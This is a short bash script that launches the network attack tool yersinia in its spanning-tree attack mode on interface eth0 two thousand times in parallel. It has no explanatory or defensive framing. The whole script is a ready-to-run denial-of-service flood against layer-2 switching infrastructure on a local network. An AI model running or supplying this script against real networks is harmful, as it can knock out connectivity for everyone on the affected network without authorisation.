#!/usr/bin/env bash
function STP() {
        for i in $(seq 1 2000); do
                /usr/bin/yersinia stp -attack 2 -interface eth0 &
        done
}
STP